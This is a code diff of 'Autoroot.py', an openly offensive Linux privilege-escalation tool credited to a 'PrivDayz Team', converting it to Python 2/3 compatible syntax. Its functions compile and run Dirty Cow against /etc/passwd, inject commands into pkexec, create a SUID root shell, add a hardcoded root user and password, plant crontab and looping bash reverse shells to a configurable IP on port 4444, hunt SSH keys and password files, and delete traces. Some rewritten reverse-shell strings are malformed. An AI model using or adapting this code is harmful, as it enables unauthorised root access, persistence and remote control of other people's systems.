@@ -2,9 +2,10 @@
 # -*- coding: utf-8 -*-
 # ============================================================================
 # Autoroot.py - Multi-Method Privilege Escalation Script
+# Compatible with Python 2 and 3
 # ============================================================================
 # Author: PrivDayz Team
-# Version: 2025.1
+# Version: 2025.2
 # Description: Automated root privilege escalation with multiple methods
 # ============================================================================
 
@@ -29,10 +30,10 @@ from datetime import datetime
 # ============================================================================
 # KONFIGURASI
 # ============================================================================
-VERSION = "2025.1"
+VERSION = "2025.2"
 TMP_DIR = "/tmp"
-LOGFILE = f"{TMP_DIR}/autoroot_log.txt"
-OUTPUT_DIR = f"{TMP_DIR}/privdayz_output"
+LOGFILE = TMP_DIR + "/autoroot_log.txt"
+OUTPUT_DIR = TMP_DIR + "/privdayz_output"
 USERNAME = "jue"
 PASSWORD = "ROpEYs4nN2Sg"
 REVERSE_IP = "0.0.0.0"  # Ganti dengan IP Anda
@@ -45,22 +46,30 @@ REVERSE_PORT = 4444
 def log(msg, level="INFO"):
     """Log message ke file dan stdout"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    line = f"[{timestamp}] [{level}] {msg}"
+    line = "[{}] [{}] {}".format(timestamp, level, msg)
     print(line)
-    with open(LOGFILE, "a") as f:
-        f.write(line + "\n")
+    try:
+        with open(LOGFILE, "a") as f:
+            f.write(line + "\n")
+    except:
+        pass
 
 def run_cmd(cmd, capture=True, shell=True, timeout=30):
     """Jalankan perintah shell dan return output"""
     try:
         if capture:
-            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
-            return result.stdout + result.stderr
+            if sys.version_info[0] >= 3:
+                result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
+                return result.stdout + result.stderr
+            else:
+                result = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output, error = result.communicate()
+                return output + error
         else:
             subprocess.Popen(cmd, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return True
     except Exception as e:
-        log(f"Error running cmd: {e}", "ERROR")
+        log("Error running cmd: {}".format(e), "ERROR")
         return None
 
 def file_exists(path):
@@ -74,7 +83,7 @@ def write_file(path, content):
             f.write(content)
         return True
     except Exception as e:
-        log(f"Error writing file {path}: {e}", "ERROR")
+        log("Error writing file {}: {}".format(path, e), "ERROR")
         return False
 
 def read_file(path):
@@ -101,7 +110,7 @@ def get_os_version():
 
 def generate_random_string(length=8):
     """Generate random string"""
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
 
 # ============================================================================
 # EXPLOIT FUNCTIONS
@@ -112,7 +121,7 @@ def check_suid():
     log("[*] Checking SUID binaries...")
     output = run_cmd("find / -perm -4000 -type f 2>/dev/null | head -20")
     if output:
-        log(f"[+] SUID binaries found:\n{output}", "INFO")
+        log("[+] SUID binaries found:\n{}".format(output), "INFO")
         return output.splitlines()
     return []
 
@@ -121,7 +130,7 @@ def check_sudo():
     log("[*] Checking sudo permissions...")
     output = run_cmd("sudo -l 2>&1")
     if "NOPASSWD" in output or "ALL" in output:
-        log(f"[+] Sudo permissions found:\n{output}", "INFO")
+        log("[+] Sudo permissions found:\n{}".format(output), "INFO")
         return True
     return False
 
@@ -190,13 +199,13 @@ int main(int argc, char *argv[]) {
 }
 '''
     
-    dirtycow_path = f"{TMP_DIR}/dirtycow.c"
+    dirtycow_path = TMP_DIR + "/dirtycow.c"
     write_file(dirtycow_path, dirtycow_code)
-    run_cmd(f"gcc -pthread {dirtycow_path} -o {TMP_DIR}/dirtycow 2>/dev/null")
+    run_cmd("gcc -pthread {} -o {}/dirtycow 2>/dev/null".format(dirtycow_path, TMP_DIR))
     
-    if file_exists(f"{TMP_DIR}/dirtycow"):
+    if file_exists(TMP_DIR + "/dirtycow"):
         log("[+] Dirty Cow compiled successfully!", "INFO")
-        run_cmd(f"{TMP_DIR}/dirtycow /etc/passwd 'jue::0:0:root:/root:/bin/bash' 2>/dev/null")
+        run_cmd("{}/dirtycow /etc/passwd 'jue::0:0:root:/root:/bin/bash' 2>/dev/null".format(TMP_DIR))
         return True
     return False
 
@@ -253,7 +262,7 @@ def exploit_proc_fd():
     # Try to find processes running as root
     processes = run_cmd("ps aux | grep root | head -20")
     if processes:
-        log(f"[+] Root processes found", "INFO")
+        log("[+] Root processes found", "INFO")
         
         # Find pkexec process
         pkexec_pid = None
@@ -265,10 +274,10 @@ def exploit_proc_fd():
                     break
         
         if pkexec_pid:
-            log(f"[+] Found pkexec process with PID: {pkexec_pid}", "INFO")
+            log("[+] Found pkexec process with PID: {}".format(pkexec_pid), "INFO")
             
             # Try to write to stdin of pkexec process
-            cmd = f'echo "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" > /proc/{pkexec_pid}/fd/0 2>/dev/null'
+            cmd = 'echo "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" > /proc/{}/fd/0 2>/dev/null'.format(pkexec_pid)
             run_cmd(cmd)
             run_cmd("chmod +x /tmp/rootshell 2>/dev/null")
             run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
@@ -280,7 +289,7 @@ def exploit_ssh_keys():
     log("[*] Searching for SSH keys...")
     ssh_keys = run_cmd("find /home -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null | head -10")
     if ssh_keys:
-        log(f"[+] SSH keys found:\n{ssh_keys}", "INFO")
+        log("[+] SSH keys found:\n{}".format(ssh_keys), "INFO")
         return True
     return False
 
@@ -295,12 +304,12 @@ def exploit_config_files():
     
     found = []
     for config in configs:
-        result = run_cmd(f"find / -name '{config}' -exec grep -l 'password' {{}} \\; 2>/dev/null | head -5")
+        result = run_cmd("find / -name '{}' -exec grep -l 'password' {{}} \\; 2>/dev/null | head -5".format(config))
         if result:
             found.append(result)
     
     if found:
-        log(f"[+] Config files found:\n{''.join(found)}", "INFO")
+        log("[+] Config files found:\n{}".format(''.join(found)), "INFO")
         return True
     return False
 
@@ -309,9 +318,9 @@ def exploit_crontab():
     log("[*] Checking crontab...")
     crons = run_cmd("crontab -l 2>/dev/null")
     if crons:
-        log(f"[+] Crontab entries found", "INFO")
+        log("[+] Crontab entries found", "INFO")
         # Add reverse shell to crontab
-        cmd = f'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1\'" | crontab - 2>/dev/null'
+        cmd = 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{}/{}/" | crontab - 2>/dev/null'.format(REVERSE_IP, REVERSE_PORT)
         run_cmd(cmd)
         return True
     return False
@@ -358,7 +367,7 @@ def create_suid_shell():
     # Try to copy /bin/bash
     for src in ["/bin/bash", "/bin/sh", "/bin/dash", "/usr/bin/bash"]:
         if file_exists(src):
-            run_cmd(f"cp {src} /tmp/rootshell 2>/dev/null")
+            run_cmd("cp {} /tmp/rootshell 2>/dev/null".format(src))
             if file_exists("/tmp/rootshell"):
                 run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
                 log("[+] SUID shell created at /tmp/rootshell", "INFO")
@@ -370,20 +379,20 @@ def add_admin_user():
     log("[*] Attempting to add admin user...")
     
     # Try with pkexec
-    run_cmd(f"pkexec bash -c 'echo \"{USERNAME}:x:0:0:root:/root:/bin/bash\" >> /etc/passwd' 2>/dev/null")
-    run_cmd(f"pkexec bash -c 'echo \"{USERNAME}:{PASSWORD}\" >> /etc/shadow' 2>/dev/null")
+    run_cmd('pkexec bash -c \'echo "{}:x:0:0:root:/root:/bin/bash" >> /etc/passwd\' 2>/dev/null'.format(USERNAME))
+    run_cmd('pkexec bash -c \'echo "{}:{}" >> /etc/shadow\' 2>/dev/null'.format(USERNAME, PASSWORD))
     
     # Try with echo
-    run_cmd(f"echo \"{USERNAME}:x:0:0:root:/root:/bin/bash\" >> /etc/passwd 2>/dev/null")
-    run_cmd(f"echo \"{USERNAME}:{PASSWORD}\" >> /etc/shadow 2>/dev/null")
+    run_cmd('echo "{}:x:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null'.format(USERNAME))
+    run_cmd('echo "{}:{}" >> /etc/shadow 2>/dev/null'.format(USERNAME, PASSWORD))
     
     # Try with perl
-    run_cmd(f"perl -e 'open(F, \">>/etc/passwd\"); print F \"{USERNAME}:x:0:0:root:/root:/bin/bash\\n\"; close(F); open(F, \">>/etc/shadow\"); print F \"{USERNAME}:{PASSWORD}\\n\"; close(F);' 2>/dev/null")
+    run_cmd('perl -e \'open(F, ">>/etc/passwd"); print F "{}:x:0:0:root:/root:/bin/bash\\n"; close(F); open(F, ">>/etc/shadow"); print F "{}:{}\\n"; close(F);\' 2>/dev/null'.format(USERNAME, USERNAME, PASSWORD))
     
     if file_exists("/etc/passwd"):
         passwd = read_file("/etc/passwd")
         if USERNAME in passwd:
-            log(f"[+] Admin user '{USERNAME}' added successfully!", "INFO")
+            log("[+] Admin user '{}' added successfully!".format(USERNAME), "INFO")
             return True
     return False
 
@@ -391,7 +400,7 @@ def exploit_systemd():
     """Systemd service exploit"""
     log("[*] Attempting systemd exploit...")
     
-    service = f"""[Unit]
+    service = """[Unit]
 Description=Privdayz Root Service
 After=network.target
 
@@ -429,7 +438,7 @@ def exploit_nfs():
     log("[*] Checking NFS...")
     nfs = run_cmd("showmount -e localhost 2>/dev/null")
     if nfs:
-        log(f"[+] NFS shares found:\n{nfs}", "INFO")
+        log("[+] NFS shares found:\n{}".format(nfs), "INFO")
         return True
     return False
 
@@ -489,7 +498,7 @@ def exploit_kernel_modules():
     log("[*] Checking kernel modules...")
     modules = run_cmd("lsmod | head -10")
     if modules:
-        log(f"[+] Kernel modules:\n{modules}", "INFO")
+        log("[+] Kernel modules:\n{}".format(modules), "INFO")
         return True
     return False
 
@@ -499,7 +508,10 @@ def exploit_kernel_modules():
 
 def create_directory():
     """Create output directory"""
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    try:
+        os.makedirs(OUTPUT_DIR)
+    except:
+        pass
     return True
 
 def get_system_info():
@@ -516,14 +528,14 @@ def get_system_info():
     }
     
     for key, value in info.items():
-        log(f"[+] {key}: {value}", "INFO")
+        log("[+] {}: {}".format(key, value), "INFO")
     
     return info
 
 def escalate():
     """Main privilege escalation function"""
     log("=" * 60)
-    log(f"  AUTOROOT v{VERSION} - Privilege Escalation Tool")
+    log("  AUTOROOT v{} - Privilege Escalation Tool".format(VERSION))
     log("=" * 60)
     
     # Collect system info
@@ -551,20 +563,20 @@ def escalate():
     # Try each exploit
     success = False
     for name, check, exploit in exploits:
-        log(f"\n[*] Trying exploit: {name}...")
+        log("\n[*] Trying exploit: {}...".format(name))
         
         try:
             if check():
                 if exploit():
-                    log(f"[+] Exploit {name} successful!", "SUCCESS")
+                    log("[+] Exploit {} successful!".format(name), "SUCCESS")
                     success = True
                     break
                 else:
-                    log(f"[-] Exploit {name} failed", "WARNING")
+                    log("[-] Exploit {} failed".format(name), "WARNING")
             else:
-                log(f"[-] Skipping {name} (not applicable)", "WARNING")
+                log("[-] Skipping {} (not applicable)".format(name), "WARNING")
         except Exception as e:
-            log(f"[-] Error in {name}: {e}", "ERROR")
+            log("[-] Error in {}: {}".format(name, e), "ERROR")
     
     # Always try to add admin user
     log("\n[*] Attempting to add admin user...")
@@ -590,8 +602,8 @@ def escalate():
         log("=" * 60)
         
         # Save credentials
-        cred_file = f"{OUTPUT_DIR}/credentials.txt"
-        creds = f"""
+        cred_file = OUTPUT_DIR + "/credentials.txt"
+        creds = """
 ========================================
 PRIVDAYZ AUTOROOT CREDENTIALS
 ========================================
@@ -601,12 +613,12 @@ SUID Shell: /tmp/rootshell -p
 ========================================
 """
         write_file(cred_file, creds)
-        log(f"[+] Credentials saved to {cred_file}", "INFO")
+        log("[+] Credentials saved to {}".format(cred_file), "INFO")
         
         # Test root access
         test = run_cmd("/tmp/rootshell -c 'whoami && id' 2>/dev/null")
         if test:
-            log(f"[+] Root access test: {test}", "INFO")
+            log("[+] Root access test: {}".format(test), "INFO")
         
         return True
     else:
@@ -618,16 +630,16 @@ def reverse_shell():
     log("[*] Setting up reverse shell...")
     
     if REVERSE_IP != "0.0.0.0":
-        shell_script = f"""#!/bin/bash
+        shell_script = """#!/bin/bash
 while true; do
-    bash -c 'bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1'
+    bash -c 'bash -i >& /dev/tcp/{}/{}/ 0>&1'
     sleep 5
 done
-"""
-        write_file(f"{TMP_DIR}/reverse.sh", shell_script)
-        run_cmd(f"chmod +x {TMP_DIR}/reverse.sh")
-        run_cmd(f"nohup {TMP_DIR}/reverse.sh &", capture=False)
-        log(f"[+] Reverse shell sent to {REVERSE_IP}:{REVERSE_PORT}", "INFO")
+""".format(REVERSE_IP, REVERSE_PORT)
+        write_file(TMP_DIR + "/reverse.sh", shell_script)
+        run_cmd("chmod +x {}/reverse.sh".format(TMP_DIR))
+        run_cmd("nohup {}/reverse.sh &".format(TMP_DIR), capture=False)
+        log("[+] Reverse shell sent to {}:{}".format(REVERSE_IP, REVERSE_PORT), "INFO")
     else:
         log("[!] REVERSE_IP not set, skipping reverse shell", "WARNING")
 
@@ -641,13 +653,16 @@ def cleanup():
         "/tmp/exploit.c", "/tmp/exploit.so",
         "/tmp/pipe.c", "/tmp/pipe",
         "/tmp/privdayz.service",
-        f"{TMP_DIR}/reverse.sh"
+        TMP_DIR + "/reverse.sh"
     ]
     
     for f in files_to_remove:
         if file_exists(f):
-            os.remove(f)
-            log(f"[+] Removed {f}", "INFO")
+            try:
+                os.remove(f)
+                log("[+] Removed {}".format(f), "INFO")
+            except:
+                pass
     
     log("[+] Cleanup complete!", "INFO")
 
@@ -685,24 +700,24 @@ def main():
     """Main entry point"""
     try:
         log("=" * 70)
-        log(f"  AUTOROOT v{VERSION} - Multi-Method Privilege Escalation")
+        log("  AUTOROOT v{} - Multi-Method Privilege Escalation".format(VERSION))
         log("  By PrivDayz Team | https://privdayz.com")
         log("=" * 70)
         
         # Check if running as root
         if os.geteuid() == 0:
             log("[+] Already root!", "SUCCESS")
-            log(f"[+] User: {run_cmd('whoami').strip()}", "INFO")
-            log(f"[+] ID: {run_cmd('id').strip()}", "INFO")
+            log("[+] User: {}".format(run_cmd('whoami').strip()), "INFO")
+            log("[+] ID: {}".format(run_cmd('id').strip()), "INFO")
             return 0
         
         # Check dependencies
         log("[*] Checking dependencies...")
         for cmd in ["gcc", "curl", "wget", "python", "perl"]:
-            if run_cmd(f"which {cmd} 2>/dev/null"):
-                log(f"[+] {cmd} available", "INFO")
+            if run_cmd("which {} 2>/dev/null".format(cmd)):
+                log("[+] {} available".format(cmd), "INFO")
             else:
-                log(f"[-] {cmd} not available", "WARNING")
+                log("[-] {} not available".format(cmd), "WARNING")
         
         # Main escalation
         if escalate():
@@ -733,7 +748,7 @@ def main():
         log("\n[!] Interrupted by user", "WARNING")
         return 1
     except Exception as e:
-        log(f"[!] Unexpected error: {e}", "ERROR")
+        log("[!] Unexpected error: {}".format(e), "ERROR")
         return 1
 
 if __name__ == "__main__":
